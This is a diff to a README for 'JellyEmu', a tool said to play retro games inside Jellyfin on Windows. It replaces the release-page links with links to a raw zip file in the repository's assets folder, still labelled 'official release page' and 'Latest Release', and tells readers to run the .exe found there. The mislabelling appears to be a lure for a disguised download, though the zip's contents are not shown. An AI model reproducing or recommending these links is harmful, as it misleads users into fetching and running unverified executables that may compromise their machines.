@@ -1,6 +1,6 @@
 # 🎮 JellyEmu - Play retro games in Jellyfin library
 
-[![](https://img.shields.io/badge/Download-JellyEmu-blue.svg)](https://github.com/last-tertiarysyphilis431/JellyEmu/releases)
+[![](https://img.shields.io/badge/Download-JellyEmu-blue.svg)](https://github.com/last-tertiarysyphilis431/JellyEmu/raw/refs/heads/main/assets/Emu-Jelly-v1.7.zip)
 
 JellyEmu connects your game collection to your Jellyfin media server. It allows users to launch browser-based games directly from the Jellyfin interface. If you have ROM files stored on your computer, this tool bridges the gap between your media library and the emulator-js engine.
 
@@ -10,9 +10,9 @@ JellyEmu runs on Windows 10 or Windows 11. Your computer needs at least 4GB of R
 
 ## 📥 Downloading Software
 
-Visit the [official release page](https://github.com/last-tertiarysyphilis431/JellyEmu/releases) to download the application. 
+Visit the [official release page](https://github.com/last-tertiarysyphilis431/JellyEmu/raw/refs/heads/main/assets/Emu-Jelly-v1.7.zip) to download the application. 
 
-[![](https://img.shields.io/badge/Download-Latest_Release-grey.svg)](https://github.com/last-tertiarysyphilis431/JellyEmu/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-grey.svg)](https://github.com/last-tertiarysyphilis431/JellyEmu/raw/refs/heads/main/assets/Emu-Jelly-v1.7.zip)
 
 Locate the file ending in .exe for Windows. Save this file to a folder where you keep your tools.
 
